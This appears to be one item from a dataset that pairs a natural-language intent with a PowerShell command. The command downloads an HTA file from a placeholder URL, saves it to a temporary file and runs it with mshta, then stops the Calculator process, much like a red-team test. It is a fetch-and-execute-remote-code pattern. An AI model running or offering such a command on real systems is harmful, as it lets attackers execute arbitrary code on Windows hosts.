# Natural language intent:
# Download an HTA file, save it to a temporary file, execute it using mshta, wait for 15 seconds, and then stop the Calculator process.

$var =Invoke-WebRequest "${hta_url}" ; $var.content|out-file "${temp_file}" ; mshta "${temp_file}" ; start-sleep -s 15 ; stop-process -name "calculator" -Force
